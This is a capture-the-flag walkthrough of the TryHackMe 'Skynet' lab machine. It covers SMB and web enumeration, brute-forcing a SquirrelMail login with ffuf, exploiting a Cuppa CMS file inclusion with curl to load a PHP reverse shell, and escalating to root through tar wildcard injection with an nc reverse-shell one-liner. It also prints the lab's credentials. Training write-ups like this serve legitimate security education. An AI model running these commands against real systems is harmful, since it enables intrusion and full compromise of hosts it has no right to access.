# TryHackMe Machine Skynet

## Scanning

```shell
PORT    STATE SERVICE
22/tcp  open  ssh
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http
|_http-title: Skynet
110/tcp open  pop3
|_pop3-capabilities: RESP-CODES CAPA TOP PIPELINING AUTH-RESP-CODE SASL UIDL
139/tcp open  netbios-ssn
143/tcp open  imap
|_imap-capabilities: Pre-login LOGINDISABLEDA0001 IDLE LITERAL+ SASL-IR more have post-login listed ENABLE capabilities IMAP4rev1 OK ID LOGIN-REFERRALS
445/tcp open  microsoft-ds

Host script results:
|_clock-skew: mean: 1h37m20s, deviation: 2h53m12s, median: -2m40s
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2022-08-16T07:27:24-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-08-16T12:27:24
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

### Enumeration

**SMB**

```shell
	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      Skynet Anonymous Share
	milesdyson      Disk      Miles Dyson Personal Share
	IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            SKYNET
```
There is an anonymous share we can access that without password.
```shell
smbclient //$ip/anonymous
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 21:04:00 2020
  ..                                  D        0  Tue Sep 17 12:20:17 2019
  attention.txt                       N      163  Wed Sep 18 08:04:59 2019
  logs                                D        0  Wed Sep 18 09:42:16 2019

		9204224 blocks of size 1024. 5818464 blocks available
smb: \> cd logs
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 09:42:16 2019
  ..                                  D        0  Thu Nov 26 21:04:00 2020
  log2.txt                            N        0  Wed Sep 18 09:42:13 2019
  log1.txt                            N      471  Wed Sep 18 09:41:59 2019
  log3.txt                            N        0  Wed Sep 18 09:42:16 2019

		9204224 blocks of size 1024. 5818460 blocks available
```

`log1.txt` have some kind of password list.

`attention.txt` mentioned the name `Miles Dyson`

**HTTP**

*Content-Discovery Result*
```
ffuf -w /usr/share/wordlist/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://$ip/FUZZ
admin                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 188ms]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 188ms]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 188ms]
config                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 189ms]
ai                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 188ms]
squirrelmail            [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 248ms]
```

`squirrelmail` have a login funtionality

After trying user `milesdyson` with `log1.txt` passwords on above endpoint found valid credentials

```shell
ffuf -w log1.txt:FUZZ -u http://10.10.108.117/squirrelmail/src/redirect.php -X POST -d "login_username=milesdyson&secretkey=FUZZ&js_autodetect_results=1&just_logged_in=1" -H "Content-Type: application/x-www-form-urlencoded" -fs 1789
```

**Valid Credentials**
```
milesdyson:cyborg007haloterminator
```
Using above credentials we can login to `squirrelmail` server and there are some emails.

Samba Password reset
```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```
Another Password found.


Other Emails and its content.
```
From: serenakogan@skynet
01100010 01100001 01101100 01101100 01110011 00100000 01101000 01100001 01110110
01100101 00100000 01111010 01100101 01110010 01101111 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111

---
i can i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i i can i i i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i . . . . . . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i i i i i everything else . . . . . . . . . . . . . .
balls have 0 to me to me to me to me to me to me to me to me to
you i i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
```
Nothing Special there.

**SMB - Miles**
We have miles smb password so we can login to that and see what's there.

```shell
smbclient //$ip/milesdyson -U milesdyson
Password for [WORKGROUP\milesdyson]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Sep 17 14:05:47 2019
  ..                                  D        0  Wed Sep 18 08:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 14:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 14:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 14:05:14 2019
  notes                               D        0  Tue Sep 17 14:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 14:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 14:05:14 2019

		9204224 blocks of size 1024. 5818448 blocks available
smb: \> cd notes
smb: \notes\> ls
  .                                   D        0  Tue Sep 17 14:18:40 2019
  ..                                  D        0  Tue Sep 17 14:05:47 2019
  3.01 Search.md                      N    65601  Tue Sep 17 14:01:29 2019
  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 14:01:29 2019
  2.08 In Practice.md                 N     7949  Tue Sep 17 14:01:29 2019
  0.00 Cover.md                       N     3114  Tue Sep 17 14:01:29 2019
  1.02 Linear Algebra.md              N    70314  Tue Sep 17 14:01:29 2019
  important.txt                       N      117  Tue Sep 17 14:18:39 2019
  6.01 pandas.md                      N     9221  Tue Sep 17 14:01:29 2019
  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 14:01:29 2019
  2.01 Overview.md                    N     1165  Tue Sep 17 14:01:29 2019
  3.02 Planning.md                    N    71657  Tue Sep 17 14:01:29 2019
  1.04 Probability.md                 N    62712  Tue Sep 17 14:01:29 2019
  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 14:01:29 2019
  2.00 Machine Learning.md            N       26  Tue Sep 17 14:01:29 2019
  1.03 Calculus.md                    N    40779  Tue Sep 17 14:01:29 2019
  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 14:01:29 2019
  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 14:01:29 2019
  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 14:01:29 2019
  6.00 Appendices.md                  N       20  Tue Sep 17 14:01:29 2019
  1.01 Functions.md                   N     7627  Tue Sep 17 14:01:29 2019
  2.03 Neural Nets.md                 N   144726  Tue Sep 17 14:01:29 2019
  2.04 Model Selection.md             N    33383  Tue Sep 17 14:01:29 2019
  2.02 Supervised Learning.md         N    94287  Tue Sep 17 14:01:29 2019
  4.00 Simulation.md                  N       20  Tue Sep 17 14:01:29 2019
  3.05 In Practice.md                 N     1123  Tue Sep 17 14:01:29 2019
  1.07 Graphs.md                      N     5110  Tue Sep 17 14:01:29 2019
  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 14:01:29 2019
  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 14:01:29 2019
  5.03 Anonymization.md               N     2516  Tue Sep 17 14:01:29 2019
  5.01 Process.md                     N     5788  Tue Sep 17 14:01:29 2019
  1.09 Optimization.md                N    25823  Tue Sep 17 14:01:29 2019
  1.05 Statistics.md                  N    64291  Tue Sep 17 14:01:29 2019
  5.02 Visualization.md               N      940  Tue Sep 17 14:01:29 2019
  5.00 In Practice.md                 N       21  Tue Sep 17 14:01:29 2019
  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 14:01:29 2019
  1.10 Algorithms.md                  N    28790  Tue Sep 17 14:01:29 2019
  3.04 Filtering.md                   N    13360  Tue Sep 17 14:01:29 2019
  1.00 Foundations.md                 N       22  Tue Sep 17 14:01:29 2019

		9204224 blocks of size 1024. 5818448 blocks available
```
The **important.txt** file have some usefull things.
```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```
`/45kra24zxs28v3yd` looks like an http directory. And it is.

**Content-Discovery**
```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:F -u http://$ip/45kra24zxs28v3yd/F -o ffuf2.log -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.108.117/45kra24zxs28v3yd/F
 :: Wordlist         : F: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Output file      : ffuf2.log
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

administrator           [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 188ms]
```

### Exploitation

Administrator Page shows its a cuppa CMS and by using `searchsploit cuppa cms` we found a potentials RFI vulnerability that give us initial foothold.
first we have to make `shell.php` file that have php reverse shell code I use PentestMonkey Php Reverse shell code so you can use that also.
After that we have to serve that file with any http server I use `python3` HTTP server using the following command.
```shell
python3 -m http.server 80
```
> **Note**: Use this command on the same directory where your php reverse shell file exits
After that we have to start our listener to catch reverse shell. We can do that with the following command.
```shell
nc -lvnp 4444
```
Now we are ready to launch our exploit. We can launch our attack with `curl` or manually using browser.
```shell
curl http://10.10.108.117/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://$ip/shell.php
```
##### Upgrade Shell

If every thing goes well now you should have a reverse shell. So now we have to upgrade that shell with higher pty shell so we can use it like our normal
shell. Just follow the following command.
```shell
python3 -c "import pty;pty.spawn('/bin/bash')"
```
When you run above command in your reverse shell you should see your shell looks a little bit better but they are not that good right now so we have make it more better.
Press `CTRL + Z` shortcut key of your keyboard. This will background your reverse shell.
After that use the following command.

Press `Enter` key twice and now you can use `CTRL+C` to kill your processes not your shell.
But there is one more step we have to do. Just Copy paste all the following command in your reverse shell.
```shell
export TERM=x-term256color
stty raw -echo;fg
alias diff='diff --color=auto'
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias grep='grep --color=auto'
alias ip='ip --color=auto'
alias l='ls -CF'
alias la='ls -A'
alias ll='ls -l'
alias ls='ls --color=auto'
```
Now you should have a Reverse Shell That looks like a SSH Shell.

### Privilege Escalation

There is a `cronjob` running on every minute.
```shell
cat /etc/crontab
```
Root user run `/home/milesdyson/backups/backups.sh` on every minute. `backup.sh` have the following content.
```shell
www-data@skynet:/home/milesdyson/backups$ ll
total 1640
-rwxr-xr-x 1 root root      74 Sep 17  2019 backup.sh
-rw-r--r-- 1 root root 4413440 Aug 16 09:58 backup.tgz
www-data@skynet:/home/milesdyson/backups$ cat backup.sh 
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

There they backup everything in `/var/www/html` diretory to `backup.tgz`. But they use wildcard in command and this is vulnerable to wildcard injection.
We can get shell by running the following command in `/var/www/html` directory

```shell
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.186.33 5555 >/tmp/f" > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh" touch "/var/www/html/--checkpoint=1"
```

What they are doing is they make a file in `/var/www/html` directory with the name `--checkpoint-action=exec=sh shell.sh`,`/var/www/html/--checkpoint=1` and `shell.sh` which have our reverse shell.
So when the cron job run `tar` command take that directory name as a arguments and they execute our shell command because of `--checkpoint-action=exec=sh shell.sh` and In that shell command they execute our reverse shell script. They give us Reverse Shell.
> **Note**: You have to start listener using `nc -lvnp 5555` Command so you can catch the reverse shell.
